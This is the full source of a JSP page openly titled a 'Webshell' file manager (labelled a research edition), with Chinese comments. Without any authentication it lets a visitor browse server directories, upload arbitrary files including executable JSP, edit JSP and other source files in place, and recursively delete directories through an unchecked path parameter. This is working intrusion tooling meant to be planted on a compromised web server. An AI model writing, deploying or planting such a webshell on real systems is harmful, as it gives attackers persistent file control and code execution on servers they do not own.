<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*, java.util.*, javax.servlet.http.Part, java.net.URLEncoder, java.nio.file.Files, java.nio.file.Paths" %>
<%!
    // 用于显示消息的变量
    String message = "";
    String messageType = "info"; // 可以是 'info', 'success', 'error'

    // 简单的JavaScript字符串转义
    private String escapeJavaScript(String text) {
        return text.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n").replace("\r", "\\r");
    }
%>
<%
    // 获取当前目录的绝对路径
    String currentPath = application.getRealPath("/");
    // 获取请求中的'path'参数，如果存在则更新当前路径
    String reqPath = request.getParameter("path");
    if (reqPath != null && !reqPath.trim().isEmpty()) {
        File requestedFile = new File(currentPath, reqPath);
        if (requestedFile.exists() && requestedFile.isDirectory()) {
            currentPath = requestedFile.getAbsolutePath();
        } else {
            // 如果请求的路径无效或不是目录，则回退到根目录或显示错误
            message = "错误: 请求的路径无效或不是目录。";
            messageType = "error";
        }
    }

    // 确保路径以文件分隔符结尾，以便正确处理子目录
    if (!currentPath.endsWith(File.separator)) {
        currentPath += File.separator;
    }

    // 处理文件操作
    String action = request.getParameter("action");
    String target = request.getParameter("target"); // 目标文件或目录

    if ("upload".equals(action)) {
        try {
            // 确保请求是multipart/form-data
            if (request.getContentType() != null && request.getContentType().startsWith("multipart/form-data")) {
                for (Part part : request.getParts()) {
                    String fileName = part.getSubmittedFileName();
                    if (fileName != null && !fileName.isEmpty()) {
                        // 防止路径遍历攻击
                        fileName = new File(fileName).getName();
                        String filePath = currentPath + fileName;
                        part.write(filePath);
                        message = "文件 '" + fileName + "' 上传成功！";
                        messageType = "success";
                    }
                }
            } else {
                message = "错误: 上传请求格式不正确。";
                messageType = "error";
            }
        } catch (Exception e) {
            message = "文件上传失败: " + e.getMessage();
            messageType = "error";
        }
    } else if ("delete".equals(action) && target != null) {
        // target现在是URL编码的相对路径，需要先解码
        String decodedTarget = java.net.URLDecoder.decode(target, "UTF-8");
        // 使用应用程序根路径和解码后的相对路径构建File对象
        File fileToDelete = new File(application.getRealPath("/"), decodedTarget);

        try {
            if (fileToDelete.exists()) {
                if (fileToDelete.isDirectory()) {
                    // 递归删除目录
                    Files.walk(fileToDelete.toPath())
                           .sorted(Comparator.reverseOrder())
                           .map(java.nio.file.Path::toFile)
                           .forEach(File::delete);
                    message = "目录 '" + decodedTarget + "' 及其内容已删除。";
                    messageType = "success";
                } else {
                    if (fileToDelete.delete()) {
                        message = "文件 '" + decodedTarget + "' 已删除。";
                        messageType = "success";
                    } else {
                        message = "文件 '" + decodedTarget + "' 删除失败。";
                        messageType = "error";
                    }
                }
            } else {
                message = "错误: 文件或目录 '" + decodedTarget + "' 不存在。";
                messageType = "error";
            }
        } catch (Exception e) {
            message = "删除失败: " + e.getMessage();
            messageType = "error";
        }
    } else if ("save".equals(action) && target != null) {
        String fileContent = request.getParameter("fileContent");
        // 防止路径遍历攻击
        File fileToSave = new File(currentPath, new File(target).getName());
        try (FileOutputStream fos = new FileOutputStream(fileToSave);
             OutputStreamWriter osw = new OutputStreamWriter(fos, "UTF-8");
             BufferedWriter writer = new BufferedWriter(osw)) {
            writer.write(fileContent);
            message = "文件 '" + target + "' 保存成功！";
            messageType = "success";
        } catch (Exception e) {
            message = "文件保存失败: " + e.getMessage();
            messageType = "error";
        }
    }

    // 获取当前目录的文件列表
    File currentDirFile = new File(currentPath);
    File[] files = currentDirFile.listFiles();
    if (files == null) {
        files = new File[0]; // 如果目录不存在或无法访问，则返回空数组
        message = "错误: 无法访问目录 " + currentPath;
        messageType = "error";
    }

    // 对文件进行排序，目录在前，文件在后，然后按名称排序
    Arrays.sort(files, (f1, f2) -> {
        if (f1.isDirectory() && !f2.isDirectory()) return -1;
        if (!f1.isDirectory() && f2.isDirectory()) return 1;
        return f1.getName().compareToIgnoreCase(f2.getName());
    });
%>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webshell 文件管理器 - 研究版</title>
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f4f7f6;
            color: #333;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .container {
            background-color: #ffffff;
            padding: 25px 30px;
            border-radius: 12px;
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 900px;
            margin-bottom: 20px;
            box-sizing: border-box;
        }
        h1, h2 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 25px;
            font-weight: 600;
        }
        .current-path {
            background-color: #e9ecef;
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-size: 0.9em;
            color: #555;
            word-wrap: break-word; /* 允许长路径换行 */
            overflow-wrap: break-word; /* 兼容性 */
        }
        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0 8px; /* 行间距 */
            margin-top: 20px;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #dee2e6;
        }
        th {
            background-color: #f8f9fa;
            font-weight: 600;
            color: #495057;
            border-bottom: 2px solid #adb5bd;
        }
        tr:last-child td {
            border-bottom: none;
        }
        tr:hover {
            background-color: #f0f0f0;
        }
        td a {
            color: #007bff;
            text-decoration: none;
            transition: color 0.2s ease;
        }
        td a:hover {
            color: #0056b3;
            text-decoration: underline;
        }
        .action-buttons a, .action-buttons button {
            background-color: #6c757d;
            color: white;
            padding: 8px 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85em;
            text-decoration: none;
            margin-right: 5px;
            transition: background-color 0.2s ease, transform 0.1s ease;
            display: inline-block; /* 确保按钮在同一行 */
        }
        .action-buttons a:hover, .action-buttons button:hover {
            background-color: #5a6268;
            transform: translateY(-1px);
        }
        .action-buttons .delete-btn {
            background-color: #dc3545;
        }
        .action-buttons .delete-btn:hover {
            background-color: #c82333;
        }
        .action-buttons .edit-btn {
            background-color: #28a745;
        }
        .action-buttons .edit-btn:hover {
            background-color: #218838;
        }

        .upload-form, .editor-form {
            margin-top: 30px;
            padding: 20px;
            background-color: #f8f9fa;
            border-radius: 10px;
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.05);
        }
        .upload-form input[type="file"],
        .upload-form button,
        .editor-form textarea,
        .editor-form button {
            padding: 10px 15px;
            border-radius: 6px;
            border: 1px solid #ced4da;
            margin-right: 10px;
            font-size: 1em;
        }
        .upload-form button, .editor-form button {
            background-color: #007bff;
            color: white;
            border: none;
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
        }
        .upload-form button:hover, .editor-form button:hover {
            background-color: #0056b3;
            transform: translateY(-1px);
        }
        .editor-form textarea {
            width: calc(100% - 22px); /* 减去padding和border */
            height: 400px;
            margin-bottom: 15px;
            font-family: 'Cascadia Code', 'Consolas', 'Monaco', monospace;
            font-size: 0.95em;
            line-height: 1.5;
            resize: vertical;
            background-color: #fff;
            color: #333;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05);
        }

        .message-box {
            display: none; /* 默认隐藏 */
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            padding: 15px 25px;
            border-radius: 8px;
            font-weight: bold;
            color: white;
            z-index: 1000;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            animation: fadeIn 0.5s ease-out;
        }
        .message-box.info { background-color: #17a2b8; }
        .message-box.success { background-color: #28a745; }
        .message-box.error { background-color: #dc3545; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(-50%) translateY(-20px); }
            to { opacity: 1; transform: translateX(-50%) translateY(0); }
        }

        /* 响应式设计 */
        @media (max-width: 768px) {
            .container {
                padding: 15px 20px;
            }
            table, th, td {
                display: block; /* 在小屏幕上堆叠表格内容 */
            }
            th {
                text-align: right; /* 标题右对齐 */
                padding-bottom: 0;
            }
            td {
                text-align: right;
                border-bottom: none;
                position: relative;
                padding-left: 50%; /* 为伪元素留出空间 */
            }
            td::before {
                content: attr(data-label); /* 使用data-label显示标题 */
                position: absolute;
                left: 0;
                width: 45%;
                padding-left: 15px;
                font-weight: bold;
                text-align: left;
            }
            .action-buttons {
                text-align: right;
            }
            .action-buttons a, .action-buttons button {
                margin-top: 5px;
                width: 100%;
                box-sizing: border-box;
            }
        }
    </style>
    <script>
        // 自定义消息框的JavaScript函数
        function showMessageBox(msg, type) {
            const msgBox = document.getElementById('messageBox');
            const msgText = document.getElementById('messageText');
            msgText.textContent = msg;
            msgBox.className = 'message-box ' + type;
            msgBox.style.display = 'block';
            setTimeout(() => {
                msgBox.style.display = 'none';
            }, 5000); // 5秒后自动隐藏
        }

        // 自定义确认删除对话框
        function confirmDelete(displayName, targetPathEncoded, currentPathEncoded) {
            const confirmBox = document.createElement('div');
            confirmBox.className = 'message-box error'; // 使用error样式作为警告
            confirmBox.style.display = 'block';
            confirmBox.style.width = 'auto';
            confirmBox.style.padding = '20px';
            confirmBox.style.textAlign = 'center';
            confirmBox.innerHTML = `
                <p>确定要删除 "${displayName}" 吗？</p>
                <button id="confirmDeleteBtn" style="background-color: #28a745; margin: 5px; padding: 10px 15px; border: none; border-radius: 6px; color: white; cursor: pointer;">确定</button>
                <button id="cancelDeleteBtn" style="background-color: #6c757d; margin: 5px; padding: 10px 15px; border: none; border-radius: 6px; color: white; cursor: pointer;">取消</button>
            `;
            document.body.appendChild(confirmBox);

            document.getElementById('confirmDeleteBtn').onclick = function() {
                // Construct the URL for deletion, passing the current path and target file
                window.location.href = `?action=delete&path=${currentPathEncoded}&target=${targetPathEncoded}`;
                document.body.removeChild(confirmBox);
            };

            document.getElementById('cancelDeleteBtn').onclick = function() {
                document.body.removeChild(confirmBox);
            };
        }
    </script>
</head>
<body>
    <div id="messageBox" class="message-box">
        <span id="messageText"></span>
    </div>

    <div class="container">
        <h1>Webshell 文件管理器</h1>
        <p class="current-path">当前路径: <code><%= currentPath %></code></p>

        <table>
            <thead>
                <tr>
                    <th>名称</th>
                    <th>大小</th>
                    <th>最后修改时间</th>
                    <th>操作</th>
                </tr>
            </thead>
            <tbody>
                <%
                    // 返回上一级目录
                    String parentPath = new File(currentPath).getParent();
                    String currentPathRelativeEncoded = URLEncoder.encode(new File(application.getRealPath("/")).toURI().relativize(currentDirFile.toURI()).getPath(), "UTF-8");
                    if (parentPath != null) {
                        String parentPathRelative = new File(application.getRealPath("/")).toURI().relativize(new File(parentPath).toURI()).getPath();
                %>
                <tr>
                    <td data-label="名称"><a href="?path=<%= URLEncoder.encode(parentPathRelative, "UTF-8") %>">.. (上级目录)</a></td>
                    <td data-label="大小"></td>
                    <td data-label="最后修改时间"></td>
                    <td data-label="操作"></td>
                </tr>
                <%
                    }
                %>
                <%
                    for (File file : files) {
                        String fileName = file.getName();
                        // Get the relative path of the file from the application root for URL encoding
                        String fileRelativePath = new File(application.getRealPath("/")).toURI().relativize(file.toURI()).getPath();
                        String filePathEncoded = URLEncoder.encode(fileRelativePath, "UTF-8");

                        String displaySize = "";
                        if (file.isFile()) {
                            long size = file.length();
                            if (size < 1024) {
                                displaySize = size + " B";
                            } else if (size < 1024 * 1024) {
                                displaySize = String.format("%.2f KB", size / 1024.0);
                            } else if (size < 1024 * 1024 * 1024) {
                                displaySize = String.format("%.2f MB", size / (1024.0 * 1024.0));
                            } else {
                                displaySize = String.format("%.2f GB", size / (1024.0 * 1024.0 * 1024.0));
                            }
                        } else {
                            displaySize = "目录";
                        }
                        String lastModified = new Date(file.lastModified()).toString();
                %>
                <tr>
                    <td data-label="名称">
                        <% if (file.isDirectory()) { %>
                            <a href="?path=<%= filePathEncoded %>">📁 <%= fileName %></a>
                        <% } else { %>
                            📄 <%= fileName %>
                        <% } %>
                    </td>
                    <td data-label="大小"><%= displaySize %></td>
                    <td data-label="最后修改时间"><%= lastModified %></td>
                    <td data-label="操作" class="action-buttons">
                        <% if (file.isFile()) { %>
                            <%
                                // 允许编辑的文件类型
                                String[] editableExtensions = {".jsp", ".java", ".txt", ".html", ".xml", ".css", ".js", ".json", ".md"};
                                boolean isEditable = false;
                                for (String ext : editableExtensions) {
                                    if (fileName.toLowerCase().endsWith(ext)) {
                                        isEditable = true;
                                        break;
                                    }
                                }
                                if (isEditable) {
                            %>
                                <a href="?action=edit&path=<%= currentPathRelativeEncoded %>&target=<%= URLEncoder.encode(fileName, "UTF-8") %>" class="edit-btn">编辑</a>
                            <% } %>
                        <% } %>
                        <button class="delete-btn" onclick="confirmDelete('<%= escapeJavaScript(fileName) %>', '<%= filePathEncoded %>', '<%= currentPathRelativeEncoded %>')">删除</button>
                    </td>
                </tr>
                <%
                    }
                %>
            </tbody>
        </table>

        <div class="upload-form">
            <h2>上传文件</h2>
            <form action="?path=<%= currentPathRelativeEncoded %>&action=upload" method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit">上传</button>
            </form>
        </div>

        <%
            // 文本编辑器部分
            if ("edit".equals(action) && target != null) {
                // 防止路径遍历攻击
                File fileToEdit = new File(currentPath, new File(target).getName());
                if (fileToEdit.exists() && fileToEdit.isFile()) {
                    StringBuilder fileContent = new StringBuilder();
                    try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(fileToEdit), "UTF-8"))) {
                        String line;
                        while ((line = reader.readLine()) != null) {
                            fileContent.append(line).append("\n");
                        }
                    } catch (Exception e) {
                        message = "读取文件失败: " + e.getMessage();
                        messageType = "error";
                    }
        %>
        <div class="editor-form">
            <h2>编辑文件: <%= target %></h2>
            <form action="?path=<%= currentPathRelativeEncoded %>&action=save&target=<%= URLEncoder.encode(target, "UTF-8") %>" method="post">
                <textarea name="fileContent"><%= fileContent.toString().replace("<", "&lt;").replace(">", "&gt;") %></textarea>
                <button type="submit">保存</button>
                <button type="button" onclick="window.location.href='?path=<%= currentPathRelativeEncoded %>'">取消</button>
            </form>
        </div>
        <%
                } else {
                    message = "错误: 无法编辑文件 '" + target + "'。文件不存在或不是文件。";
                    messageType = "error";
                }
            }
        %>
    </div>

    <script>
        // 如果有消息，则显示
        <% if (!message.isEmpty()) { %>
            showMessageBox('<%= escapeJavaScript(message) %>', '<%= messageType %>');
        <% } %>
    </script>
</body>
</html>